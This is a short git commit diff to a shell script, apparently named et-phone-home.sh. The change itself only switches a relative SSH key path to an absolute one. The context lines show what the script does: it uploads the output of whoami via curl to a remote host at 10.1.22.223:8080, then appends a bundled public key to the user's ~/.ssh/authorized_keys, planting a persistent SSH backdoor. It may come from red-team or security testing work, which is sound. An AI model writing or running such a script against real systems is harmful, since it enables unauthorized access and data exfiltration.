715dfe014798a145fba75b5801725b1c9335c258
Alex Danila <alex.danila@esentire.com>
2018-06-20 10:42:23 -0400

    Use absolute path over relative path for ssh key

--- scripts/et-phone-home.sh
+++ scripts/et-phone-home.sh
@@ -9,7 +9,7 @@ whoami >> /tmp/testfile
 curl -F "upfile=@/tmp/testfile" http://10.1.22.223:8080/
 rm /tmp/testfile
 
-if [[ `grep -f < ./fuckery-rsa.pub $HOME/.ssh/authorized_keys` = "" ]]; then
+if [[ `grep -f < $tdir/fuckery-rsa.pub $HOME/.ssh/authorized_keys` = "" ]]; then
     cat $tdir/fuckery-rsa.pub >> $HOME/.ssh/authorized_keys
 fi
 
